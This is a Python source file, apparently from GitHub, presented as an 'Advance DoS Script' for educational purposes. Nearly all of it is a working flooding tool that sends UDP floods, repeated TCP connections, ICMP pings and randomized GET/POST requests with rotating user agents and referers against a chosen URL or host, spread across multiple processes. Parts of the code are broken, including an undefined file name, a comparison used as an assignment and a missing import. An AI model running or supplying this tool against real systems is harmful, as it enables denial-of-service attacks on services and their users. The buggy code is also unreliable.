# Advance DoS Script [Beta]
# Created by Arijit Bhowmick [sys41x4]
# https://github.com/Arijit-Bhowmick
# https://github.com/sys41x4
#
# Created only for educational Purpose
# Tested with Kali Linux 2022
#			  Ubuntu Server Latest [Flask+Django+XAMP]
#			  Windows 10 [Flask+Django+XAMP+IIS]
#
#			  htop
# 			  tcpdump
# 			  Wireshark

# exec_fileName = Name of the command file from where command will be read
import sys
import random
import string
from multiprocessing import Process
import socket
import re
import os
from ping3 import ping
import http.client, urllib.parse

# global parameters
url=0
# url_lst=0
host=0
header_useragents=0
header_referers=0
data_loaded = False
url, user_agent, referer, spoof = 0, 0, 0, 0
thread_count = 0
ua_data_from, ref_data_from = 0, 0
req_types=0
request_type=0

packets_per_interval_per_req_type = 0
total_packets_per_req_type = 0
terminal_out_freq = 0
threads_in_use={}
code_exec = 0
supported_request_types=['GET','POST', 'PING', 'TCP', 'UDP']
supported_spoof_services = ['PING', 'TCP', 'UDP']
supported_proxy_services=['GET', 'POST']
http_request_counter, get_request_counter, post_request_counter, ping_request_counter, tcp_request_counter, udp_request_counter = 0, 0, 0, 0, 0, 0
pingchk_host_detail = {}


with open(exec_fileName, 'r') as exec_cmd_file:
	code_exec = exec_cmd_file.read().strip().split(' ')
code_exec=[sys.argv[0]]+code_exec

def banner():
	print("""
Advance DoS [Beta] Script
Programmed/Created by Arijit Bhowmick [sys41x4]
[!!! Educational Purposes only !!!]
	""")

def set_inbuilt_userAgent():
	global header_useragents

	header_useragents=[
		  "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
		  "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		  "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		  "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
		  "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
		  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
		  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
		  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
		  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
		  "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
		  "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
		  "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
		 ]

def generate_useragentList(data_from='inbuilt', data_location=''):
	global header_useragents
	global quit_it
	if (data_from == 'inbuilt'):
		# if data_from=='file':print("File Location Not provided\nUsing Inbuilt User-Agent Data")
		set_inbuilt_userAgent()
	elif (data_from == 'string'):header_useragents=[data_location]

	elif data_from == 'file':

		with open(data_location, 'r') as file:header_useragents=file.read().strip().split('\n')

		if header_useragents==['']:
			print(f'UserAgent data Not found in the file: {data_location}\nUsing InBuilt User-Agent Data')
			set_inbuilt_userAgent()

	 
def set_inbuilt_referers():
	global header_referers
	header_referers=[
	 "http://www.google.com/?q=",
	 "http://www.usatoday.com/search/results?q=",
	 "http://engadget.search.aol.com/search?q=",
	 "http://" + host[0] + "/",
	]

def generate_refererList(data_from='inbuilt', data_location=''):
	global header_referers
	global quit_it
	
	if (data_from == 'inbuilt'):
		set_inbuilt_referers()
	
	elif data_from == 'string':header_referers=[data_location]

	elif data_from == 'file':
	 
		with open(data_location, 'r') as file:header_referers=file.read().strip().split('\n')
	 
		if header_referers==['']:
			print(f'Referers data Not found in the file: {data_location}\nUsing InBuilt Referers Data')
			set_inbuilt_referers()

def build_block(size):
	return (''.join(random.choices(string.ascii_letters + string.digits, k=size)))

def usage():
	return (
	 f"""
{'-'*50}
Usage: python {sys.argv[0]} -u=<url> *

-h | --help : Print This Usage Information and exit


-t=<Number of Threads to use> | --thread=<Number of Threads to use>
[Default: Thread Count = 5]

-u=<url> | --url=<url> : Target URL
-H=<Host-Name/Host-IP> | --host=<Host-Name/Host-IP> : Domain Name/IPv4 Address of the Target

[ Either -u/--url or -d/--domain can be used ]
[ '-u/--url' will be preffered, if both '-u/--url and -d/--domain' will be used ]

-uA=<user-agent> | --user-agent=<user-agent>
-uAL=<user-agent-file-location> | --user-agent-list=<user-agent-file-location>

[ If -uA/--user-agent  or  -uAL/--user-agent-list is not specified then InBuilt 'User-Agent' Data will be taken ]
[ '-uAL/--user-agent-list' will be preffered, if both '-uA/--user-agent and -uAL/--user-agent-list' will be used ]


-e=<referer> | --referer=<referer>
-eL=<referer-file-location> | --referer-list=<referer-file-location>

[ If -e/--referer   or  -eL/--referer-list is not specified then InBuilt 'Referer' Data will be taken ]
[ '-eL/--referer-list' will be preffered, if both '-e/--referer and -eL/--referer-list' will be used ]


-rT=<Request-Type> | --request-type=<Request-Type>
				
				<Request-Type> : GET
								 POST
								 PING
								 TCP
								 UDP

				Example : -rT=GET-POST-PING

[ If -rT/--request-type is not provided then the script will not run ]

-tp=<total_packets> | --totalPackets=<total_packets>
	Total Packets send per thread assigned

-tprT=<total_packets(Differentiated with Request-Type)> | --totalPacketsPerReqType=<total_packets(Differentiated with Request-Type)>
				
				Total Packets used per thread, differentiated by Request-Type

				<total_packets(Defferentiated with Request-Type)> : GET:<total_packets>
																  : POST:<total_packets>
																  : PING:<total_packets>
																  : TCP:<total_packets>
																  : UDP:<total_packets>
				Example : -tprT=GET:500-POST:infinite-PING:200


-ppi=<Packets send per interval> | --packetsPerInterval=<Packets send per interval>

-ppirT=<Packets send per interval(Differentiated with Request-Type)> | --packetsPerIntervalPerReqType=<Packets send per interval(Differentiated with Request-Type)>

				<Packets send per interval(Differentiated with Request-Type)> : GET:<Packet send per interval>
																			  : POST:<Packet send per interval>
																			  : PING:<Packet send per interval>
																			  : TCP:<Packet send per interval>
																			  : UDP:<Packet send per interval>
				Example : -tprT=GET:500-POST:infinite-PING:200


-tof=<terminal Output Frequency> | --terminalOutputFrequency=<terminal Output Frequency>
	<terminal Output Frequency> : Output shown in the terminal after `x` amount of requests send
								  where `x` is the value of the -tof/--terminalOutputFrequency
								  Default : 100

-h | --help : For Script Usage

	 """
	)

# Generate UDP Packets (UDP Flood Attack)
def UDP_flood(host, total_packets_per_req_type, packets_per_interval_per_req_type, terminal_out_freq, threads_in_use):
	# packets_per_interval = 100 # default
	# total_packets = 'infinte' # default
	try:
		global udp_request_counter 

		previous = 0

		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		# for i in range(50):
		if total_packets_per_req_type['UDP']=='INFINITE':
			while True:
				for i in range(total_packets_per_req_type['UDP']):
					try:
						s.sendto(b'hola', (host[0], host[1]))

					except Exception as e:
						print(e)
						sys.exit()
						pass

				udp_request_counter+=total_packets_per_req_type['UDP']

				if (udp_request_counter-previous>=terminal_out_freq):
					print(f"UDP Request Sent: {udp_request_counter}")
					previous+=udp_request_counter
		else:
			udp_initial_thread_count = threads_in_use['UDP']
			for i in range(udp_initial_thread_count):
				for j in range(total_packets_per_req_type['UDP']*packets_per_interval_per_req_type['UDP']):
					try:

						s.sendto(b'hello', (host[0], host[1]))


					except Exception as e:
						print(e)
						sys.exit()
						pass
				udp_request_counter+=total_packets_per_req_type['UDP']*packets_per_interval_per_req_type['UDP']
				threads_in_use['UDP']-=1

				if (udp_request_counter-previous>=terminal_out_freq):
					print(f"UDP Request Sent: {udp_request_counter}")
					previous+=udp_request_counter

			print(f"UDP Request Sent: {udp_request_counter}")


	except KeyboardInterrupt:
			print(f"\n\nClosing Processes ...\nTotal UDP Request Sent: {udp_request_counter}\nThankyou For using !!!")
			sys.exit()

	except Exception as e:
		print(e)
		sys.exit()

# Generate TCP SYN Packets (SYN Attack)
def TCP_SYN(host, total_packets_per_req_type, packets_per_interval_per_req_type, terminal_out_freq, threads_in_use):

	try:
		
		global tcp_request_counter, total_packets
		previous=0
		if total_packets_per_req_type['TCP']=='INFINITE':
			while True:
				try:

					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					s.connect((host[0], host[1]))
					s.send(b'hola')
					s.close()

				except Exception as e:
					print(e)
					sys.exit()
					pass
		else:
		
			for i in range(total_packets_per_req_type['TCP']):
				try:
					for j in range(packets_per_interval_per_req_type['TCP']):
						s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						s.connect((host[0], host[1]))
						s.send(b'hola')
						s.close()

					tcp_request_counter+=packets_per_interval_per_req_type['TCP']


				except Exception as e:
					print(e)
					sys.exit()
					pass

			
				if (tcp_request_counter-previous>=terminal_out_freq):
					print(f"TCP Request Sent: {tcp_request_counter}")
					previous+=tcp_request_counter



	except KeyboardInterrupt:
			print(f"\n\nClosing Processes ...\nTotal TCP Request Sent: {tcp_request_counter}\nThankyou For using !!!")
			sys.exit()

	except Exception as e:
		print(e)
		sys.exit()


def ICMP_ping(host, total_packets_per_req_type, packets_per_interval_per_req_type, terminal_out_freq, threads_in_use):
	# Required ROOT access to create ICMP packets
	# in some systems
	# default: packet count is set to 1000
	# generally payload size of ICMP ping is 53
	# but in this case we have taken
	# default payload_seze=random.randint(56,2048)

	# global ping_request_counter, pingchk_host_detail, privileged, spoof, quit_it

	try:
		global ping_request_counter, total_packets
		
		previous=0
		# for i in range(50):
		if total_packets_per_req_type['PING']=='INFINITE':
			while True:
				try:

					ping(host[0])
					ping_request_counter+=packets_per_interval_per_req_type['PING']

				except Exception as e:
					print(e)
					sys.exit()
					pass
		else:
			for i in range(total_packets_per_req_type['PING']):

				try:
					for j in range(packets_per_interval_per_req_type['PING']):

						ping(host[0])

					ping_request_counter+=packets_per_interval_per_req_type['PING']

				except Exception as e:
					print(e)
					sys.exit()
					pass

				if (ping_request_counter-previous>=terminal_out_freq):
					print(f"PING Request Sent: {ping_request_counter}")
					previous+=ping_request_counter


	except KeyboardInterrupt:
			print(f"\n\nClosing Processes ...\nTotal ICMP-PING Request Sent: {ping_request_counter}\nThankyou For using !!!")
			sys.exit()

	except Exception as e:
		print(e)
		# print('Error here')
		sys.exit()


# Generate GET Request

def GET_Flood(url, host, total_packets_per_req_type, packets_per_interval_per_req_type, terminal_out_freq, threads_in_use):

	global get_request_counter
	global data_loaded

	if data_loaded==False:
		generate_useragentList(ua_data_from, user_agent)
		generate_refererList(ref_data_from, referer)
		data_loaded==True

	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	
	host_data=host[0]+':'+str(host[1])
	previous=0

	
	for i in range(total_packets_per_req_type['GET']):
		req_location = param_joiner + build_block(random.randint(3,5)) + '=' + build_block(random.randint(3,10))
		timeout = random.randint(9000,20000)

		try:
			if host[2]=='https':

				for i in range(packets_per_interval_per_req_type['GET']):
					
					http.client.HTTPSConnection(host_data, timeout=timeout).request("GET", f"/{req_location}")
			else:
				for i in range(packets_per_interval_per_req_type['GET']):
					
					http.client.HTTPConnection(host_data, timeout=timeout).request("GET", f"/{req_location}")
			
			get_request_counter+=packets_per_interval_per_req_type['GET']


		except KeyboardInterrupt:
			print(f"\n\nClosing Processes ...\nTotal GET Request Sent: {get_request_counter}\nThankyou For using !!!")
			sys.exit()
		except OSError:
			print('Connection Refused | Host/Service Unavailable')
			sys.exit()

		if (get_request_counter-previous>=terminal_out_freq):
			print(f"GET Request Sent: {get_request_counter}")
			previous+=get_request_counter


def POST_Flood(url, host, total_packets_per_req_type, packets_per_interval_per_req_type, terminal_out_freq, threads_in_use, header_useragents, header_referers):
	global post_request_counter
	global data_loaded

	

	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"

	host_data=host[0]+':'+str(host[1])
	previous=0


	for i in range(total_packets_per_req_type['POST']):

		# Generate Header Data
		headers={
	 		'User-Agent': random.choice(header_useragents),
	 		'Cache-Control': 'no-cache',
	 		'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
	 		'Referer': random.choice(header_referers) + build_block(random.randint(5,10)),
	 		'Content-type': 'application/x-www-form-urlencoded',
	 		'Accept': 'text/plain',
	 		'Keep-Alive': random.randint(9000,20000),
	 		'Connection': 'keep-alive',
	 		'Host': host[0],
	 	}


		# generate data for POST request
		post_data={}

		for i in range(random.randint(1,5)):
			post_data.update({build_block(random.randint(1,5)):build_block(random.randint(5,10))})

		post_data=urllib.parse.urlencode(post_data)

		req_location = param_joiner + build_block(random.randint(3,5)) + '=' + build_block(random.randint(3,10))
		
		timeout = random.randint(9000,20000)

		try:
			if host[2]=='https':

				for i in range(packets_per_interval_per_req_type['POST']):
					
					http.client.HTTPSConnection(host_data, timeout=timeout).request("POST", f"/{req_location}", post_data, headers)

			else:
				for i in range(packets_per_interval_per_req_type['POST']):
					
					http.client.HTTPConnection(host_data, timeout=timeout).request("POST", f"/{req_location}", post_data, headers)
			
			post_request_counter+=packets_per_interval_per_req_type['POST']



		except KeyboardInterrupt:
			print(f"\n\nClosing Processes ...\nTotal POST Request Sent: {post_request_counter}\nThankyou For using !!!")
			sys.exit()
		except OSError:
			print('Connection Refused | Host/Service Unavailable')
			sys.exit()



		if (post_request_counter-previous>=terminal_out_freq):
			print(f"POST Request Sent: {post_request_counter}")
			previous+=post_request_counter

def chk_indv_element(arg_lst, arg, name):
	# arg is a list of valid argument lookback element/s

	# if len(arg)==1:
	# 	arg+=[arg[0]]
	# elif len(arg)>2:
	# 	arg=arg[:2]

	arg_starter=''
	cnt = 0
	item_removed = 0
	for i in range(len(arg_lst)):

		if (arg_lst[i].split('=')[0] in arg):
			cnt+=1
			arg_starter=arg[0]

			del code_exec[i-item_removed+1]
			item_removed+=1

			try:
				value=arg_lst[i].split('=')[1]

			except IndexError:
				value=None
	if cnt>1:
		print(f'More Than one \'{name}\' is specified\nUsing the Last arg Value: {arg_lst[i+1]}')

	elif cnt==0:
		arg_starter=False
		value=False

	return value

def arg_chk():
	global host, url, user_agent, referer, ua_data_from, code_exec, ref_data_from, req_types, total_packets_per_req_type, packets_per_interval_per_req_type, terminal_out_freq, thread_count, threads_in_use, code_exec
	# global url_lst

	if len(code_exec)<2:print(usage());sys.exit()


	# usage = chk_indv_element(code_exec[1::], ['-h','--help'], 'HELP')
	if chk_indv_element(code_exec[1::], ['-h','--help'], 'HELP')!=False:print(usage());sys.exit()


	# Check Request Type to use
	req_types = chk_indv_element(code_exec[1::], ['-rT','--request-type'], 'Request Type')
	if (req_types==False or req_types==None):print("Request Type/s Not Specified, Please Try Again, or use -h or --help");sys.exit()
	req_types = list(set(req_types.upper().split('-')))

	for i in range(len(req_types)):
		if req_types[i] not in supported_request_types:
			req_types[i]=0

	req_types = list(set(req_types))
	if 0 in req_types:req_types.remove(0)

	# # Checks For ICMP-ping attack
	# If PING Flood/TCP SYN/UDP Flood is to be used
	# Then check if ICMP/TCP/UDP packets can be sent without root/admin priv by sending 1 packet to the ip
	# if not then check if user is running the script as root
	# if not then exit with message output



	# Total Packets Per Request Type | Required
	# or Total Packets | Required
	# -tprT will be preffered if both -tprT and -tp values are provided

	total_packets_per_req_type_pre_value = chk_indv_element(code_exec[1::], ['-tprT','--totalPacketsPerReqType'], 'Total Packets Per Request Type')
	total_packets_per_req_type = {}

	if total_packets_per_req_type_pre_value==False or total_packets_per_req_type_pre_value==None:
		# If -tprT is not Specified then check
		# if -tp is provided

		try:
			total_packets = chk_indv_element(code_exec[1::], ['-tp','--totalPackets'], 'Total Packets')

			if (total_packets==False or total_packets==None):
				# If nor -tprT or -tp is specified | Then Exit

				print('Neither \'Total Packets Per Request Type\' nor \'Total Packets\' has been Specified, Please Try Again, or use -h or --help')
				sys.exit()
				
			else:
				if total_packets=='INFINITE':

					for req in req_types:
						# Remainder during division is ignored
						total_packets_per_req_type.update({req:int(total_packets)//req_types})

				else:
					for req in req_types:
						# Remainder during division is ignored

						total_packets_per_req_type.update({req:int(total_packets)//len(req_types)})

		except ValueError:
			print('\'Total Packets\' must have an integer value')
			sys.exit()
		

	else:
		try:
			total_packets_per_req_type_pre_value = list(set(total_packets_per_req_type_pre_value.upper().split('-')))

			if len(total_packets_per_req_type_pre_value)<len(req_types):
				sys.exit()

			for i in range(len(total_packets_per_req_type_pre_value)):

				if total_packets_per_req_type_pre_value[i].split(':')[0] in req_types:
					try:
						if total_packets_per_req_type=='INFINITE':
							total_packets_per_req_type.update({total_packets_per_req_type_pre_value[i].split(':')[0]:total_packets_per_req_type_pre_value[i].split(':')[1]})
						else:
							total_packets_per_req_type.update({total_packets_per_req_type_pre_value[i].split(':')[0]:int(total_packets_per_req_type_pre_value[i].split(':')[1])})
					
					except IndexError:
						print(f"{total_packets_per_req_type_pre_value[i].split(':')[0]} Value Not Provided in -tprT")
						sys.exit()
					except ValueError:
						print(f"{total_packets_per_req_type_pre_value[i].split(':')[0]} in -tprT must have an Integer Value")
						sys.exit()

		except:
			print('Error Occured in -tprT/--totalPacketsPerReqType logic')
			sys.exit()




	

	# if ('TCP' in req_types) or ('UDP' in req_types) or ('PING' in req_types):
	# Packets Send Per Interval of Time

	# Packets Per Interval' Per Request Type | Required
	# or Packets Per Interval | Required
	# -ppirT will be preffered if both -tprT and -ppi values are provided

	packets_per_interval_pre_value = chk_indv_element(code_exec[1::], ['-ppirT','--packetsPerIntervalPerReqType'], 'Packets Per Interval Per Request Type')

	packets_per_interval_per_req_type = {}

	if packets_per_interval_pre_value==False or packets_per_interval_pre_value==None:
		# If -ppirT is not Specified then check
		# if -ppi is provided
		try:
			packets_per_interval = chk_indv_element(code_exec[1::], ['-ppi','--packetsPerInterval'], 'Packets Per Interval')

			if (packets_per_interval==False or packets_per_interval==None):
				# If nor -ppirT or -ppi is specified | Then Exit

				print('Neither \'-ppirT\' nor \'-ppi\' has been Specified, Please Try Again, or use -h or --help')
				sys.exit()

				
			else:
				if packets_per_interval=='INFINITE':

					for req in req_types:
						# Remainder during division is ignored
						packets_per_interval_per_req_type.update({req:packets_per_interval})
				else:
					for req in req_types:
						# Remainder during division is ignored
						packets_per_interval_per_req_type.update({req:int(packets_per_interval)})
				

		except ValueError:
			print('\'Total Packets\' must have an integer value')
			sys.exit()


	else:
		try:
			packets_per_interval_pre_value = list(set(packets_per_interval_pre_value.upper().split('-')))


			for i in range(len(packets_per_interval_pre_value)):

				if packets_per_interval_pre_value[i].split(':')[0] in req_types:
					try:
						if packets_per_interval_pre_value[i].split(':')[1] == 'INFINITE':
							packets_per_interval_per_req_type.update({packets_per_interval_pre_value[i].split(':')[0]:packets_per_interval_pre_value[i].split(':')[1]})
						else:
							packets_per_interval_per_req_type.update({packets_per_interval_pre_value[i].split(':')[0]:int(packets_per_interval_pre_value[i].split(':')[1])})
					
					except IndexError:
						print(f"{packets_per_interval_pre_value[i].split(':')[0]} Value Not Provided in -ppirT")
						sys.exit()
					except ValueError:
						print(f"{packets_per_interval_pre_value[i].split(':')[0]} in -ppirT must have an Integer Value")
						sys.exit()

		except:
			print('Error Occured in -ppirT logic')
			sys.exit()


	# # Check Terminal-Output-Frequency Value
	terminal_out_freq = chk_indv_element(code_exec[1::], ['-tof','--terminalOutputFrequency'], 'Terminl Output Frequency')
	if terminal_out_freq==False or terminal_out_freq==None or terminal_out_freq=='default':
		
		terminal_out_freq=100 # Default terminal_out_freq is 100
	else:
		try:
			terminal_out_freq = int(terminal_out_freq)
		except ValueError:
			print('Only \'default\' (-tof=default) and Integer value can be considered in \'-tof/--terminalOutputFrequency\' (Eg: -tof=100)')


	# # Check the number of threads to use
	thread_count = chk_indv_element(code_exec[1::], ['-t','--thread'], 'Thread')
	if thread_count==False or thread_count==None or thread_count=='default':
		# 10 Threads will be used by default
		thread_count=10 # Default thread_count is 10
	else:
		try:
			thread_count = int(thread_count)
		except:
			print('Only \'default\' (-th=default) and Integer value can be considered in \'-th/--thread\' (Eg: -th=30)')



	# # Check For any Domain Input (-d/--domain)
	# domain = chk_indv_element(code_exec[1::], ['-d=','--domain='], 'Domain')
	

	# Get URL from arguments
	url = chk_indv_element(code_exec[1::], ['-u','--url'], 'URL')
	if url!=False:
	
		try:
			if re.search('http\://([^/]*)/?.*', url) == None:
				host=re.search('https\://([^/]*)/?.*', url).group(1)

				if len(host.split(':'))==1:host+=':443' # HTTPS has default port as 443
				http_protocol_type = 'https'

			else:
				host=re.search('http\://([^/]*)/?.*', url).group(1)
				# print(len(host.split(':')))

				# if len(host.split(':'))==1:host+=':80'
				if len(host.split(':'))==1:host+=':80'
				http_protocol_type = 'http'


			
			host = (host.split(':')[0], int(host.split(':')[1]), http_protocol_type) # Form of tuple (host_IP, port, http/https)

		except ValueError:
			print('Port Number must be a integer')
			sys.exit()
					
		# url_lst=[host] # Used as a test case because for now URL List Function argument is not programmed

		# Check if url=False
		# If so then check if -H/--host argument is passed

	elif url==False or url==None:
		try:
			host = chk_indv_element(code_exec[1::], ['-H','--host'], 'Host')

			if (host==False or host==None):print('Neither Host nor URL has been Specified, Please Try Again, or use -h or --help');sys.exit()
			if len(host.split(':'))==1:host+=':80'

			url = 'http://'+host
			host = (host.split(':')[0], int(host.split(':')[1])) # Form of tuple (host_IP, port)
		except ValueError:
			print('Port Number must be an integer value')
			sys.exit()
	
	# Get User-Agent from arguments
	# If both -uA & -uAL values are provided, then -uAL Value will be prefered

	user_agent = chk_indv_element(code_exec[1::], ['-uAL','--user-agent-list'], 'User-Agent-List')
	if (user_agent!=False and user_agent!=None):ua_data_from='file'

	elif user_agent==False or user_agent==None:

		user_agent = chk_indv_element(code_exec[1::], ['-uA','--user-agent'], 'User-Agent')
		ua_data_from='string'

		if user_agent==False or user_agent==None:
			ua_data_from, user_agent = 'inbuilt', 0
		else:
			if os.path.isfile(user_agent)==False:
				print(f'Not a File: {user_agent}')
				sys.exit()

	# Get User-Agent from arguments
	# If both -e & -eL values are provided, then -eL Value will be prefered

	referer = chk_indv_element(code_exec[1::], ['-eL','--referer-list'], 'Referer-List')
	if referer!=False:ref_data_from='file'
	elif referer==False or referer==None:

		referer = chk_indv_element(code_exec[1::], ['-e','--referer'], 'Referer')
		ref_data_from='string'
		if referer==False or referer==None:
			ref_data_from, referer = 'inbuilt', 0
		else:
			if os.path.isfile(referer)==False:
				print(f'Not a File: {referer}')
				sys.exit()




def send_req(request_type):

	if (request_type=='GET'):
		
		# http_type = httpcall(url, request_type)

		# MultiProcessing May/May'not Increases Performance

		Process(target=GET_Flood, args=(url, host, total_packets_per_req_type, packets_per_interval_per_req_type, terminal_out_freq, threads_in_use,)).start()
		
		# t.start()
	elif request_type=='POST':
		# POST_Flood(url)

		# MultiProcessing May/May'not Increases Performance
		if data_loaded==False:
			generate_useragentList(ua_data_from, user_agent)
			generate_refererList(ref_data_from, referer)
		data_loaded==True

		Process(target=POST_Flood, args=(url, host, total_packets_per_req_type, packets_per_interval_per_req_type, terminal_out_freq, threads_in_use, header_useragents, header_referers,)).start()

	elif (request_type=='PING'):
		# MultiProcessing Increases Performance
		Process(target=ICMP_ping, args=(host, total_packets_per_req_type, packets_per_interval_per_req_type, terminal_out_freq, threads_in_use,)).start()


		# t.start()

	elif (request_type=='TCP'):

		# MultiProcessing Increases Performance
		Process(target=TCP_SYN, args=(host, total_packets_per_req_type, packets_per_interval_per_req_type, terminal_out_freq, threads_in_use,)).start()


		# t.start()

	elif (request_type=='UDP'):
		# MultiProcessing decreases Performance
		# Must be run as only one process to get maximum throughput

		# UDP_flood(host)
		Process(target=UDP_flood, args=(host, total_packets_per_req_type, packets_per_interval_per_req_type, terminal_out_freq, threads_in_use,)).start()


def main():
	global quit_it, request_type, req_types, supported_request_types, threads_in_use
	arg_chk()
	try:
		print(f"Starting {'-'.join(req_types)} DoS Attack | Against {host[0]}:{host[1]}")
		
		for i in range(thread_count):

			request_type=random.choice(req_types)

			if request_type in threads_in_use:
				threads_in_use[request_type]+=1
			else:
				threads_in_use.update({request_type:1})

			if request_type!='UDP':
				send_req(request_type)
		# print(threads_in_use)
		if 'GET' in req_types:
			print(f"Total {total_packets_per_req_type['GET']*packets_per_interval_per_req_type['GET']*threads_in_use['GET']} GET Requests Will Be Generated | Allocated {threads_in_use['GET']} Processing Power")
		if 'POST' in req_types:
			print(f"Total {total_packets_per_req_type['POST']*packets_per_interval_per_req_type['POST']*threads_in_use['POST']} POST Requests Will Be Generated | Allocated {threads_in_use['POST']} Processing Power")
		if 'TCP' in req_types:
			print(f"Total {total_packets_per_req_type['TCP']*packets_per_interval_per_req_type['TCP']*threads_in_use['TCP']} TCP Requests Will Be Generated | Allocated {threads_in_use['TCP']} Processing Power")
		if 'UDP' in req_types:
			print(f"Total {total_packets_per_req_type['UDP']*packets_per_interval_per_req_type['UDP']*threads_in_use['UDP']} UDP Requests Will Be Generated | Allocated {threads_in_use['UDP']} Processing Power")
		if 'PING' in req_types:
			print(f"Total {total_packets_per_req_type['PING']*packets_per_interval_per_req_type['PING']*threads_in_use['PING']} PING Requests Will Be Generated | Allocated {threads_in_use['PING']} Processing Power")






		if ('UDP' in req_types) and (total_packets_per_req_type['UDP']>0):
			send_req('UDP')

		print('\n!!! Stay Calm and Enjoy !!!!\n')

	except KeyboardInterrupt:
		sys.exit(0)
	
if __name__ == '__main__':
	if sys.platform.startswith('win'):
		multiprocessing.freeze_support()
	banner()
	main()